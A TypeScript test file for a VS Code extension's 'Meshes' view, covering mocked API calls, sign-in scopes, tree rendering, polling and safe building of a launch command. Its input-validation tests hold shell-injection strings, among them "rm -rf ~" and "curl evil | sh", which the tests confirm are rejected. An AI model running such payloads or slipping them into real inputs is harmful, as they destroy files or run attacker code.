// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 crossVault GmbH
// The "Meshes" view, against mock answers of GET /meshes and GET /me/mesh/cells (no server needed).
import * as assert from "assert";
import * as fs from "fs";
import * as path from "path";
import { calls, fakeMemento, fakeSecrets, resetCalls } from "../fakeVscode";
import * as ext from "../../extension";
import * as api from "../../api";
import { LoginRequest, SECRET_KEY } from "../../auth";
import {
  cellDescription, cellTooltip, detect, isTierCWindows, kind, lastSeenText, listMeshes, listMyCells, Machine, MESH_TEXTS, meshesPageUrl,
  meshInviteUrl, meshLaunchArgs, meshPageUrl, meshTree, POLL_MS, suggestCellName, Timers, validateCellName, viewAvailable, VisibilityPoller,
} from "../../meshApi";
import { CellItem, MachineItem, MeshItem, MESHES_AVAILABLE } from "../../meshesView";
import { commandLine } from "../../terminalCommand";
import type { CliLookup } from "../../cli";

const TOKEN = "lib_tok_MESH_secret_456";
const NEW_TOKEN = "lib_tok_MESH_new_789";
const BASE = "https://session-exchange.com";
const NOW = Date.parse("2026-10-28T12:00:00Z");
const HOSTNAME = "build-box-07.corp.example";

// ---- fixtures: the shapes of GET /meshes and the G1 answer of GET /me/mesh/cells ------------------

const MESHES = { meshes: [
  { id: "m_alpha", name: "Alpha team", role: "owner" },
  { id: "m_beta", name: "Beta" },
  { id: "m_empty", name: "Empty mesh" },
] };

const CELLS = { machines: [
  {
    key_id: "k_laptop", label: `laptop (${HOSTNAME})`, pinned: true, created: "2026-10-01T00:00:00Z", expires: "2027-01-01T00:00:00Z", revoked: false,
    cells: [
      { mesh: "m_alpha", instance: "i-1", name: "planner", isolation: "tier-a", status: "running", presence: "online", last_seen: "2026-10-28T11:55:00Z", reach: "relay", os: "linux", version: "0.12.3" },
      { mesh: "m_alpha", instance: "i-2", name: "builder", isolation: "tier-a", status: "stopped", presence: "offline", last_seen: "2026-10-28T11:20:00Z", reach: "none", os: "linux", version: "0.12.3" },
      { mesh: "m_beta", instance: "i-3", name: "solo", isolation: "tier-b", status: "running", presence: "online", last_seen: "2026-10-28T12:00:00Z", reach: "direct", os: "darwin", version: "0.12.3" },
    ],
  },
  {
    key_id: "k_win", label: "WIN-DESK", pairing: true, created: "2026-10-02T00:00:00Z", expires: "2026-11-02T00:00:00Z", revoked: false,
    cells: [
      { mesh: "m_alpha", instance: "i-4", name: "tester", isolation: "tier-c", status: "running", presence: "idle", last_seen: "2026-10-28T10:00:00Z", reach: "relay", os: "windows", version: "0.12.2" },
    ],
  },
  {
    key_id: "k_old", label: "old-host", pinned: true, created: "2026-01-01T00:00:00Z", expires: "2026-12-01T00:00:00Z", revoked: true,
    cells: [{ mesh: "m_beta", instance: "i-5", name: "ghost", status: "running", presence: "online", reach: "direct", os: "linux" }],
  },
  {
    key_id: "k_stranger", label: "elsewhere", pinned: true, revoked: false,
    cells: [{ mesh: "m_not_mine", instance: "i-6", name: "hidden", status: "running", presence: "online", reach: "direct", os: "linux" }],
  },
] };

const NOT_FOUND = { status: 404, body: { error: { code: "not_found", message: "no such route" } } };
const SCOPE_DENIED = { status: 403, body: { error: { code: "scope_denied", message: "needs mesh:read", details: { required_scope: "mesh:read" } } } };
const NEEDS_SIGNIN = { status: 409, body: { error: { code: "needs_signin", message: "open the website first" } } };

// ---- harness --------------------------------------------------------------------------------------

interface Req { url: string; method: string; headers: Record<string, string> }
type Answer = { status: number; body?: unknown } | Error;

function fakeFetch(routes: Record<string, Answer[]>) {
  const seen: Req[] = [];
  const fetch: api.FetchLike = async (url, init) => {
    const u = new URL(url);
    seen.push({ url, method: init?.method ?? "GET", headers: init?.headers ?? {} });
    const queue = routes[`${init?.method ?? "GET"} ${u.pathname}`];
    if (!queue || queue.length === 0) {
      throw new Error("unexpected request");
    }
    const next = queue.length > 1 ? queue.shift()! : queue[0];
    if (next instanceof Error) {
      throw next;
    }
    return { status: next.status, json: async () => (next.body === undefined ? Promise.reject(new Error("no body")) : next.body) };
  };
  return { fetch, seen };
}

const clientWith = (fetch: api.FetchLike): api.Client => ({ base: BASE, fetch, userAgent: "a4sx-vscode" });
const found = (p: string) => (): CliLookup => ({ found: true, path: p });

async function activateWith(routes: Record<string, Answer[]>, scopes: string[] | null = ["library:read", "mesh:read"]) {
  const net = fakeFetch(routes);
  ext.runtime.fetch = net.fetch;
  const logins: LoginRequest[] = [];
  ext.runtime.login = async (_c, req) => {
    logins.push(req);
    return { token: NEW_TOKEN, server: BASE, id: "t2", scopes: [...req.scopes] };
  };
  const ctx = { subscriptions: [] as { dispose(): unknown }[], secrets: fakeSecrets(), globalState: fakeMemento() };
  if (scopes) {
    await ctx.secrets.store(SECRET_KEY, JSON.stringify({ token: TOKEN, server: BASE, id: "t1", scopes }));
  }
  ext.activate(ctx as any);
  const sb = ext.sidebar!;
  await sb.meshes.reload();
  return { ctx, net, logins, sb };
}

const savedRuntime = { ...ext.runtime };
let disposeLater: { subscriptions: { dispose(): unknown }[] } | undefined;
afterEach(() => {
  Object.assign(ext.runtime, savedRuntime);
  disposeLater?.subscriptions.forEach((d) => d.dispose());
  disposeLater = undefined;
});

/** Nothing the extension shows outside the tree carries the key or a machine label. */
function nothingLeaked(): void {
  const shown = [
    ...calls.errors.map((e) => e.message), ...calls.infos, ...calls.warnings, ...calls.progress.flatMap((p) => p.messages),
    ...calls.terminals.flatMap((t) => [JSON.stringify(t.options), ...t.sent]), ...calls.opened, JSON.stringify(calls.context),
  ];
  for (const m of shown) {
    for (const secret of [TOKEN, NEW_TOKEN, HOSTNAME]) {
      assert.ok(!m.includes(secret), `leaked into a message, a terminal or a link: ${m}`);
    }
  }
}

// ---- tests ----------------------------------------------------------------------------------------

describe("meshes: HTTP client (mocked)", () => {
  it("GET /meshes and GET /me/mesh/cells send the key as a Bearer header and parse the G1 shapes", async () => {
    const net = fakeFetch({ "GET /meshes": [{ status: 200, body: MESHES }], "GET /me/mesh/cells": [{ status: 200, body: CELLS }] });
    const c = clientWith(net.fetch);
    const meshes = await listMeshes(c, TOKEN);
    assert.deepStrictEqual(meshes.map((m) => [m.id, m.name, m.role]), [["m_alpha", "Alpha team", "owner"], ["m_beta", "Beta", undefined], ["m_empty", "Empty mesh", undefined]]);
    const machines = await listMyCells(c, TOKEN);
    assert.deepStrictEqual(machines.map((m) => [m.keyId, m.binding, m.revoked, m.cells.length]), [
      ["k_laptop", "pinned", false, 3], ["k_win", "pairing", false, 1], ["k_old", "pinned", true, 1], ["k_stranger", "pinned", false, 1],
    ]);
    assert.deepStrictEqual(machines[0].cells[0], {
      mesh: "m_alpha", instance: "i-1", name: "planner", isolation: "tier-a", status: "running", presence: "online",
      last_seen: "2026-10-28T11:55:00Z", reach: "relay", os: "linux", version: "0.12.3",
    });
    assert.ok(net.seen.every((r) => r.headers.Authorization === `Bearer ${TOKEN}`));
    assert.deepStrictEqual(net.seen.map((r) => [r.method, new URL(r.url).pathname]), [["GET", "/meshes"], ["GET", "/me/mesh/cells"]]);
  });

  it("presence, reach and the other kinds are shown only as plain words: an address in their place is dropped", async () => {
    const net = fakeFetch({ "GET /me/mesh/cells": [{ status: 200, body: { machines: [{ key_id: "k", label: "x", cells: [
      { mesh: "m", presence: "10.0.0.7", reach: "203.0.113.9:443", status: "host.example.com", os: "linux kernel", isolation: "tier/c", version: "1.0; rm" },
    ] }] } }] });
    const [m] = await listMyCells(clientWith(net.fetch), TOKEN);
    const c = m.cells[0];
    assert.deepStrictEqual([c.presence, c.reach, c.status, c.os, c.isolation, c.version], [undefined, undefined, undefined, undefined, undefined, undefined]);
    assert.strictEqual(kind("Online"), "online");
    assert.strictEqual(kind("fe80::1"), undefined);
  });

  it("odd rows (no id, no mesh) are left out; a body that isn't the shape is 'bad-response'", async () => {
    const net = fakeFetch({
      "GET /meshes": [{ status: 200, body: { meshes: [{ name: "no id" }, { id: "" }, { id: "m1" }] } }, { status: 200, body: { nope: 1 } }],
      "GET /me/mesh/cells": [{ status: 200, body: { machines: [{ label: "no key" }, { key_id: "k", cells: [{ name: "no mesh" }, { mesh: "m1" }] }] } }],
    });
    const c = clientWith(net.fetch);
    assert.deepStrictEqual((await listMeshes(c, TOKEN)).map((m) => m.id), ["m1"]);
    const machines = await listMyCells(c, TOKEN);
    assert.deepStrictEqual(machines.map((m) => [m.keyId, m.cells.length]), [["k", 1]]);
    await assert.rejects(listMeshes(c, TOKEN), (e: any) => e.code === "bad-response");
  });

  it("a long or multi-line mesh name or machine label is one short line", async () => {
    const net = fakeFetch({ "GET /meshes": [{ status: 200, body: { meshes: [{ id: "m", name: `a\nb\u0007${"x".repeat(200)}` }] } }] });
    const [m] = await listMeshes(clientWith(net.fetch), TOKEN);
    assert.ok(!/[\n\u0007]/.test(m.name!));
    assert.strictEqual(m.name!.length, 80);
    assert.ok(m.name!.endsWith("…"));
  });
});

describe("meshes: feature detection", () => {
  beforeEach(resetCalls);

  it("maps 404, 403 scope_denied and 409 needs_signin to view states; others are errors", async () => {
    const net = fakeFetch({ "GET /meshes": [NOT_FOUND, SCOPE_DENIED, NEEDS_SIGNIN, { status: 401 }, { status: 503 }, new Error("down")] });
    const c = clientWith(net.fetch);
    const states = [];
    for (let i = 0; i < 6; i++) {
      states.push(await listMeshes(c, TOKEN).then(() => ({ kind: "ok" }), detect));
    }
    assert.deepStrictEqual(states, [
      { kind: "off" },
      { kind: "needs-scope", scope: "mesh:read" },
      { kind: "needs-signin" },
      { kind: "error", message: api.MESSAGES.unauthorized, unauthorized: true },
      { kind: "error", message: api.MESSAGES.busy, unauthorized: false },
      { kind: "error", message: api.MESSAGES.unreachable, unauthorized: false },
    ]);
    // A 403 scope_denied without details still means mesh:read.
    const bare = fakeFetch({ "GET /meshes": [{ status: 403, body: { error: { code: "scope_denied" } } }] });
    assert.deepStrictEqual(await listMeshes(clientWith(bare.fetch), TOKEN).then(() => undefined, detect), { kind: "needs-scope", scope: "mesh:read" });
  });

  it("the view hides when meshes are off or nobody is signed in; a dropped connection keeps what was shown", () => {
    assert.strictEqual(viewAvailable({ kind: "off" }, true), false);
    assert.strictEqual(viewAvailable({ kind: "signed-out" }, true), false);
    assert.strictEqual(viewAvailable({ kind: "needs-scope", scope: "mesh:read" }, false), true);
    assert.strictEqual(viewAvailable({ kind: "needs-signin" }, false), true);
    assert.strictEqual(viewAvailable({ kind: "ok", meshes: [], machines: [] }, false), true);
    assert.strictEqual(viewAvailable({ kind: "error", message: "x", unauthorized: false }, true), true);
    assert.strictEqual(viewAvailable({ kind: "error", message: "x", unauthorized: false }, false), false);
  });

  it("404 on GET /meshes: the view is hidden (context key false) and shows nothing", async () => {
    const { sb, ctx } = await activateWith({ "GET /meshes": [NOT_FOUND] });
    disposeLater = ctx;
    assert.strictEqual(calls.context[MESHES_AVAILABLE], false);
    assert.deepStrictEqual(await sb.meshes.getChildren(), []);
  });

  it("404 on GET /me/mesh/cells hides it too", async () => {
    const { sb, ctx } = await activateWith({ "GET /meshes": [{ status: 200, body: MESHES }], "GET /me/mesh/cells": [NOT_FOUND] });
    disposeLater = ctx;
    assert.strictEqual(calls.context[MESHES_AVAILABLE], false);
    assert.deepStrictEqual(await sb.meshes.getChildren(), []);
  });

  it("signed out: hidden, and no request at all", async () => {
    const { sb, net, ctx } = await activateWith({}, null);
    disposeLater = ctx;
    assert.strictEqual(calls.context[MESHES_AVAILABLE], false);
    assert.deepStrictEqual(await sb.meshes.getChildren(), []);
    assert.strictEqual(net.seen.length, 0);
  });

  it("403 scope_denied: 'Allow mesh read' runs the existing step-up sign-in for mesh:read, then the view loads", async () => {
    const { sb, ctx, logins, net } = await activateWith({
      "GET /meshes": [SCOPE_DENIED, { status: 200, body: MESHES }],
      "GET /me/mesh/cells": [{ status: 200, body: CELLS }],
    }, ["library:read", "profiles:read", "library:organize"]);
    disposeLater = ctx;
    assert.strictEqual(calls.context[MESHES_AVAILABLE], true, "shown, so the user can allow it");
    const [item] = await sb.meshes.getChildren();
    assert.strictEqual(item.label, MESH_TEXTS.allowMeshRead);
    assert.deepStrictEqual(item.command, { command: ext.CMD_ALLOW_SCOPE, title: MESH_TEXTS.allowMeshRead, arguments: ["mesh:read"] });
    await calls.commands.get(ext.CMD_ALLOW_SCOPE)!("mesh:read");
    assert.strictEqual(logins.length, 1);
    assert.strictEqual(logins[0].adding, "mesh:read");
    assert.deepStrictEqual([...logins[0].scopes].sort(), ["library:organize", "library:read", "mesh:read", "profiles:read"]);
    assert.ok(!logins[0].scopes.includes("mesh:join") && !logins[0].scopes.includes("mesh:admin"));
    await sb.meshes.reload();
    const top = await sb.meshes.getChildren();
    assert.deepStrictEqual(top.map((i) => i.label), ["Alpha team", "Beta", "Empty mesh"]);
    assert.strictEqual(net.seen.at(-1)!.headers.Authorization, `Bearer ${NEW_TOKEN}`, "the new key is used after the step-up");
    nothingLeaked();
  });

  it("a 403 naming another scope (mesh:join) is never offered as a sign-in", async () => {
    const { sb, ctx, logins } = await activateWith({
      "GET /meshes": [{ status: 403, body: { error: { code: "insufficient_scope", details: { required_scope: "mesh:join" } } } }],
    });
    disposeLater = ctx;
    const [item] = await sb.meshes.getChildren();
    assert.strictEqual(item.label, api.MESSAGES.needsScope("mesh:join"));
    assert.strictEqual(item.command, undefined);
    await calls.commands.get(ext.CMD_ALLOW_SCOPE)!("mesh:join");
    await calls.commands.get(ext.CMD_ALLOW_SCOPE)!("mesh:admin");
    assert.strictEqual(logins.length, 0);
  });

  it("409 needs_signin: an 'Open in browser' item opens the website's meshes page", async () => {
    const { sb, ctx } = await activateWith({ "GET /meshes": [NEEDS_SIGNIN] });
    disposeLater = ctx;
    assert.strictEqual(calls.context[MESHES_AVAILABLE], true);
    const items = await sb.meshes.getChildren();
    assert.deepStrictEqual(items.map((i) => i.label), [MESH_TEXTS.needsSignin, MESH_TEXTS.openInBrowser]);
    assert.strictEqual(items[1].command!.command, ext.CMD_OPEN_MESHES);
    await calls.commands.get(ext.CMD_OPEN_MESHES)!();
    assert.deepStrictEqual(calls.opened, [`${BASE}/meshes`]);
  });

  it("a network error shows a Refresh item; the key is never in it", async () => {
    const { sb, ctx } = await activateWith({ "GET /meshes": [new Error(`connect failed ${TOKEN}`)] });
    disposeLater = ctx;
    const [item] = await sb.meshes.getChildren();
    assert.strictEqual(item.label, api.MESSAGES.unreachable);
    assert.strictEqual(item.command!.command, ext.CMD_REFRESH_MESHES);
    assert.ok(!String(item.tooltip).includes(TOKEN));
  });
});

describe("meshes: tree model", () => {
  beforeEach(resetCalls);

  const machines = (): Machine[] => CELLS.machines.map((m) => ({
    keyId: m.key_id, label: m.label, binding: m.pinned ? "pinned" : "pairing", revoked: m.revoked, cells: m.cells.map((c) => ({ ...c })),
  })) as Machine[];

  it("meshes sorted by name; cells grouped by machine; revoked machines and other meshes' cells left out", () => {
    const nodes = meshTree(MESHES.meshes, machines());
    assert.deepStrictEqual(nodes.map((n) => [n.mesh.id, n.cellCount, n.onlineCount, n.byMachine]), [
      ["m_alpha", 3, 1, true], ["m_beta", 1, 1, false], ["m_empty", 0, 0, false],
    ]);
    const alpha = nodes[0];
    assert.deepStrictEqual(alpha.groups.map((g) => [g.machine.keyId, g.cells.map((c) => c.name)]), [
      ["k_laptop", ["planner", "builder"]], ["k_win", ["tester"]],
    ]);
    assert.ok(!nodes.flatMap((n) => n.groups).some((g) => g.machine.keyId === "k_old" || g.machine.keyId === "k_stranger"));
  });

  it("descriptions are kinds only; last seen is rounded down to 5 minutes", () => {
    assert.strictEqual(lastSeenText("2026-10-28T11:57:00Z", NOW), "seen just now");
    assert.strictEqual(lastSeenText("2026-10-28T11:46:00Z", NOW), "seen 10 min ago");
    assert.strictEqual(lastSeenText("2026-10-28T09:00:00Z", NOW), "seen 3 h ago");
    assert.strictEqual(lastSeenText("2026-10-20T12:00:00Z", NOW), "seen 8 d ago");
    assert.strictEqual(lastSeenText(NOW / 1000 - 600, NOW), "seen 10 min ago");
    assert.strictEqual(lastSeenText("not a date", NOW), undefined);
    const [laptop] = machines();
    assert.strictEqual(cellDescription(laptop.cells[0], NOW), "running · online · relay");
    assert.strictEqual(cellDescription(laptop.cells[1], NOW), "stopped · offline · none · seen 40 min ago");
  });

  it("a tier-c Windows host's tooltip says it appears as one machine per mesh", () => {
    const [laptop, win] = machines();
    assert.ok(isTierCWindows(win.cells[0]));
    assert.ok(!isTierCWindows(laptop.cells[0]));
    assert.ok(cellTooltip(win.cells[0], win, NOW).includes(MESH_TEXTS.tierCWindows));
    assert.ok(!cellTooltip(laptop.cells[0], laptop, NOW).includes(MESH_TEXTS.tierCWindows));
  });

  it("the view: mesh → machine → cell when cells span machines, mesh → cell for one machine, a Start item for none", async () => {
    const { sb, ctx } = await activateWith({ "GET /meshes": [{ status: 200, body: MESHES }], "GET /me/mesh/cells": [{ status: 200, body: CELLS }] });
    disposeLater = ctx;
    assert.strictEqual(calls.context[MESHES_AVAILABLE], true);
    const top = (await sb.meshes.getChildren()) as MeshItem[];
    assert.deepStrictEqual(top.map((i) => [i.label, i.description, i.contextValue, i.id]), [
      ["Alpha team", "3 cells · 1 online", "a4sx.mesh", "mesh:m_alpha"],
      ["Beta", "1 cell · 1 online", "a4sx.mesh", "mesh:m_beta"],
      ["Empty mesh", "no cells", "a4sx.mesh", "mesh:m_empty"],
    ]);
    const alpha = (await sb.meshes.getChildren(top[0])) as MachineItem[];
    assert.ok(alpha.every((i) => i instanceof MachineItem));
    assert.deepStrictEqual(alpha.map((i) => [i.label, i.description]), [[`laptop (${HOSTNAME})`, "2 cells"], ["WIN-DESK", "1 cell"]]);
    assert.ok(String(alpha[1].tooltip).includes(MESH_TEXTS.tierCWindows));
    assert.ok(String(alpha[1].tooltip).includes("Key: pairing"));
    assert.ok(!String(alpha[0].tooltip).includes(MESH_TEXTS.tierCWindows));
    const cells = (await sb.meshes.getChildren(alpha[0])) as CellItem[];
    assert.deepStrictEqual(cells.map((i) => [i.label, (i.iconPath as any).id, i.contextValue]), [
      ["planner", "circle-filled", "a4sx.meshCell"], ["builder", "circle-outline", "a4sx.meshCell"],
    ]);
    assert.strictEqual(cells[0].id, "mesh:m_alpha/machine:k_laptop/cell:i-1", "stable ids keep the tree's state across polls");
    const beta = (await sb.meshes.getChildren(top[1])) as CellItem[];
    assert.deepStrictEqual(beta.map((i) => [i.label, i instanceof CellItem]), [["solo", true]]);
    assert.ok(String(beta[0].tooltip).includes(`Machine: laptop (${HOSTNAME})`), "the owner sees the label in the tooltip");
    const empty = await sb.meshes.getChildren(top[2]);
    assert.strictEqual(empty[0].label, MESH_TEXTS.noCells);
    assert.deepStrictEqual(empty[0].command!.command, ext.CMD_START_IN_MESH);
    assert.deepStrictEqual(await sb.meshes.getChildren(beta[0]), []);
    nothingLeaked();
  });

  it("no meshes: a 'Create' item that opens the website", async () => {
    const { sb, ctx } = await activateWith({ "GET /meshes": [{ status: 200, body: { meshes: [] } }], "GET /me/mesh/cells": [{ status: 200, body: { machines: [] } }] });
    disposeLater = ctx;
    const [item] = await sb.meshes.getChildren();
    assert.strictEqual(item.label, MESH_TEXTS.noMeshes);
    assert.strictEqual(item.command!.command, ext.CMD_CREATE_MESH);
    await calls.commands.get(ext.CMD_CREATE_MESH)!();
    assert.deepStrictEqual(calls.opened, [`${BASE}/meshes`]);
  });
});

describe("meshes: console links", () => {
  beforeEach(resetCalls);

  it("builds the pages from the configured base URL and encodes ids", () => {
    assert.strictEqual(meshesPageUrl(BASE), `${BASE}/meshes`);
    assert.strictEqual(meshInviteUrl(BASE), `${BASE}/meshes/invite`);
    assert.strictEqual(meshPageUrl(BASE, "m_alpha"), `${BASE}/meshes/m/m_alpha`);
    assert.strictEqual(meshPageUrl(BASE, "a/../b?x=1#y z"), `${BASE}/meshes/m/a%2F..%2Fb%3Fx%3D1%23y%20z`);
  });

  it("the commands open the pages of the a4sx.serverUrl server", async () => {
    calls.config["a4sx.serverUrl"] = "https://staging.example.com/ignored/path";
    const { ctx } = await activateWith({});
    disposeLater = ctx;
    const mesh = new MeshItem(meshTree([{ id: "m/1", name: "Odd" }], [])[0]);
    await calls.commands.get(ext.CMD_OPEN_MESH)!(mesh);
    await calls.commands.get(ext.CMD_REDEEM_INVITE)!();
    await calls.commands.get(ext.CMD_CREATE_MESH)!();
    await calls.commands.get(ext.CMD_OPEN_MESH)!(undefined);
    assert.deepStrictEqual(calls.opened, [
      "https://staging.example.com/meshes/m/m%2F1", "https://staging.example.com/meshes/invite", "https://staging.example.com/meshes",
    ]);
  });
});

describe("meshes: start session in mesh", () => {
  beforeEach(resetCalls);
  const ROUTES = () => ({
    "GET /meshes": [{ status: 200, body: MESHES }] as Answer[],
    "GET /me/mesh/cells": [{ status: 200, body: CELLS }] as Answer[],
  });

  it("builds `a4sx launch --ipc-proxy --mesh <id> --as <name>` from plain pieces only", () => {
    assert.deepStrictEqual(meshLaunchArgs("m_alpha", " reviewer-2 "), ["launch", "--ipc-proxy", "--mesh", "m_alpha", "--as", "reviewer-2"]);
    for (const hostile of ["x'; rm -rf ~ #", "$(id)", "`id`", "a b", "-x", "--as=evil", "a\nb", "ä", "", "a".repeat(64), "x\"&calc", "%PATH%"]) {
      assert.strictEqual(meshLaunchArgs("m_alpha", hostile), undefined, hostile);
      assert.strictEqual(validateCellName(hostile), MESH_TEXTS.nameRule, hostile);
    }
    for (const badId of ["m;id", "-m", "m id", "$(id)", "m'x", "", "a".repeat(129)]) {
      assert.strictEqual(meshLaunchArgs(badId, "ok"), undefined, badId);
    }
    assert.strictEqual(validateCellName("ok_1"), undefined);
    assert.strictEqual(suggestCellName(["vscode", "vscode-2", undefined]), "vscode-3");
  });

  it("each piece is quoted for the shell", () => {
    const args = meshLaunchArgs("m.alpha:1", "rev")!;
    assert.strictEqual(commandLine("a4sx", args, "posix"), "'a4sx' 'launch' '--ipc-proxy' '--mesh' 'm.alpha:1' '--as' 'rev'");
    assert.strictEqual(commandLine("a4sx", args, "powershell"), "& 'a4sx' 'launch' '--ipc-proxy' '--mesh' 'm.alpha:1' '--as' 'rev'");
    assert.strictEqual(commandLine("a4sx", args, "cmd"), "\"a4sx\" \"launch\" \"--ipc-proxy\" \"--mesh\" \"m.alpha:1\" \"--as\" \"rev\"");
  });

  it("after the preflight (CLI found, mesh still listed) it types the command into a new terminal, with no key", async () => {
    const { sb, ctx, net } = await activateWith(ROUTES());
    disposeLater = ctx;
    const [alpha] = (await sb.meshes.getChildren()) as MeshItem[];
    const before = net.seen.length;
    calls.nextInput = "reviewer";
    const t = await ext.startSessionInMesh(sb.auth, alpha, found("/opt/a4sx-test/bin/a4sx"));
    assert.ok(t);
    assert.deepStrictEqual(net.seen.slice(before).map((r) => [r.method, new URL(r.url).pathname]), [["GET", "/meshes"]], "preflight: one read");
    assert.strictEqual(calls.terminals.length, 1);
    const term = calls.terminals[0];
    assert.deepStrictEqual(term.options, { name: ext.MESH_TERMINAL_NAME });
    assert.deepStrictEqual(term.sent, ["'/opt/a4sx-test/bin/a4sx' 'launch' '--ipc-proxy' '--mesh' 'm_alpha' '--as' 'reviewer'\n"]);
    assert.strictEqual(calls.inputs[0].value, "vscode");
    assert.strictEqual(calls.inputs[0].validateInput("bad name"), MESH_TEXTS.nameRule);
    nothingLeaked();
  });

  it("a hostile name typed past the input check starts nothing", async () => {
    const { sb, ctx } = await activateWith(ROUTES());
    disposeLater = ctx;
    const [alpha] = (await sb.meshes.getChildren()) as MeshItem[];
    calls.nextInput = "x'; curl evil | sh #";
    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found("/opt/a4sx-test/bin/a4sx")), undefined);
    assert.strictEqual(calls.terminals.length, 0);
    assert.deepStrictEqual(calls.errors.map((e) => e.message), [MESH_TEXTS.nameRule]);
  });

  it("a mesh id that isn't plain starts nothing and sends nothing", async () => {
    const { sb, ctx, net } = await activateWith({
      "GET /meshes": [{ status: 200, body: { meshes: [{ id: "m'$(id)", name: "Evil" }] } }],
      "GET /me/mesh/cells": [{ status: 200, body: { machines: [] } }],
    });
    disposeLater = ctx;
    const [evil] = (await sb.meshes.getChildren()) as MeshItem[];
    const before = net.seen.length;
    calls.nextInput = "ok";
    assert.strictEqual(await ext.startSessionInMesh(sb.auth, evil, found("/opt/a4sx-test/bin/a4sx")), undefined);
    assert.strictEqual(net.seen.length, before);
    assert.strictEqual(calls.terminals.length, 0);
    assert.deepStrictEqual(calls.errors.map((e) => e.message), [MESH_TEXTS.badMesh]);
  });

  it("no CLI: the install hint, no request, no prompt", async () => {
    const { sb, ctx, net } = await activateWith(ROUTES());
    disposeLater = ctx;
    const [alpha] = (await sb.meshes.getChildren()) as MeshItem[];
    const before = net.seen.length;
    await ext.startSessionInMesh(sb.auth, alpha, () => ({ found: false, reason: "not-on-path" }));
    assert.strictEqual(net.seen.length, before);
    assert.strictEqual(calls.inputs.length, 0);
    assert.strictEqual(calls.terminals.length, 0);
    assert.strictEqual(calls.errors.length, 1);
  });

  it("a mesh no longer listed, or a refused preflight, starts nothing", async () => {
    const { sb, ctx } = await activateWith({
      "GET /meshes": [{ status: 200, body: MESHES }, { status: 200, body: { meshes: [] } }, SCOPE_DENIED],
      "GET /me/mesh/cells": [{ status: 200, body: CELLS }],
    });
    disposeLater = ctx;
    const [alpha] = (await sb.meshes.getChildren()) as MeshItem[];
    await ext.startSessionInMesh(sb.auth, alpha, found("/opt/a4sx-test/bin/a4sx"));
    await ext.startSessionInMesh(sb.auth, alpha, found("/opt/a4sx-test/bin/a4sx"));
    assert.deepStrictEqual(calls.errors.map((e) => e.message), [MESH_TEXTS.meshGone, api.MESSAGES.needsScope("mesh:read")]);
    assert.strictEqual(calls.inputs.length, 0);
    assert.strictEqual(calls.terminals.length, 0);
  });

  it("Esc in the name box starts nothing; the registered command without an item does nothing", async () => {
    const { sb, ctx } = await activateWith(ROUTES());
    disposeLater = ctx;
    const [alpha] = (await sb.meshes.getChildren()) as MeshItem[];
    calls.nextInput = undefined;
    assert.strictEqual(await ext.startSessionInMesh(sb.auth, alpha, found("/opt/a4sx-test/bin/a4sx")), undefined);
    assert.strictEqual(await calls.commands.get(ext.CMD_START_IN_MESH)!(), undefined);
    assert.strictEqual(calls.terminals.length, 0);
    assert.strictEqual(calls.errors.length, 0);
  });
});

describe("meshes: polling", () => {
  beforeEach(resetCalls);

  function fakeTimers() {
    const live = new Map<number, () => void>();
    let next = 1;
    const timers: Timers = {
      setInterval: (fn, ms) => { assert.strictEqual(ms, POLL_MS); live.set(next, fn); return next++; },
      clearInterval: (h) => { live.delete(h as number); },
    };
    return { timers, live, fire: () => [...live.values()].forEach((f) => f()) };
  }
  const flush = () => new Promise((r) => setImmediate(r));

  it("polls every 30 s only while visible: a tick on show, then on the interval; none after hide", async () => {
    const t = fakeTimers();
    let ticks = 0;
    const p = new VisibilityPoller(async () => { ticks++; }, POLL_MS, t.timers);
    p.setVisible(false);
    assert.strictEqual(t.live.size, 0);
    p.setVisible(true);
    p.setVisible(true);   // shown twice: still one timer
    await flush();
    assert.strictEqual(ticks, 1);
    assert.strictEqual(t.live.size, 1);
    t.fire();
    await flush();
    assert.strictEqual(ticks, 2);
    p.setVisible(false);
    assert.strictEqual(t.live.size, 0);
    assert.strictEqual(p.active, false);
    t.fire();
    await flush();
    assert.strictEqual(ticks, 2);
    p.setVisible(true);
    await flush();
    assert.strictEqual(ticks, 3);
    p.dispose();
    assert.strictEqual(t.live.size, 0);
  });

  it("a slow tick is not started twice; a failing tick doesn't stop the poll", async () => {
    const t = fakeTimers();
    let ticks = 0;
    let release: () => void = () => undefined;
    const p = new VisibilityPoller(() => { ticks++; return new Promise<void>((r) => { release = r; }); }, POLL_MS, t.timers);
    p.setVisible(true);
    t.fire();
    t.fire();
    await flush();
    assert.strictEqual(ticks, 1);
    release();
    await flush();
    t.fire();
    await flush();
    assert.strictEqual(ticks, 2);
    release();
    const failing = new VisibilityPoller(async () => { throw new Error("boom"); }, POLL_MS, t.timers);
    failing.setVisible(true);
    await flush();
    assert.strictEqual(failing.active, true);
    p.dispose();
    failing.dispose();
  });

  it("activate: the view's visibility starts and stops the poll", async () => {
    const { sb, ctx } = await activateWith({ "GET /meshes": [{ status: 200, body: MESHES }], "GET /me/mesh/cells": [{ status: 200, body: CELLS }] });
    disposeLater = ctx;
    const view = calls.treeViews.get(ext.VIEW_MESHES)!;
    assert.strictEqual(sb.meshPoller.active, false, "a hidden view doesn't poll");
    view.setVisible(true);
    assert.strictEqual(sb.meshPoller.active, true);
    view.setVisible(false);
    assert.strictEqual(sb.meshPoller.active, false);
    view.setVisible(true);
    ctx.subscriptions.forEach((d) => d.dispose());
    disposeLater = undefined;
    assert.strictEqual(sb.meshPoller.active, false, "disposed with the extension");
  });

  it("Refresh reads both routes again", async () => {
    const { ctx, net } = await activateWith({ "GET /meshes": [{ status: 200, body: MESHES }], "GET /me/mesh/cells": [{ status: 200, body: CELLS }] });
    disposeLater = ctx;
    const before = net.seen.length;
    await calls.commands.get(ext.CMD_REFRESH_MESHES)!();
    assert.deepStrictEqual(net.seen.slice(before).map((r) => new URL(r.url).pathname), ["/meshes", "/me/mesh/cells"]);
  });
});

describe("meshes: manifest", () => {
  const pkg = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "..", "..", "package.json"), "utf8"));

  it("the view shows only when signed in and the server has meshes; item commands are hidden from the palette", () => {
    const view = pkg.contributes.views.a4sx.find((v: any) => v.id === ext.VIEW_MESHES);
    assert.strictEqual(view.name, "Meshes");
    assert.strictEqual(view.when, `a4sx.signedIn && ${MESHES_AVAILABLE}`);
    for (const cmd of [ext.CMD_OPEN_MESH, ext.CMD_START_IN_MESH]) {
      assert.ok(pkg.contributes.menus.commandPalette.some((m: any) => m.command === cmd && m.when === "false"), cmd);
    }
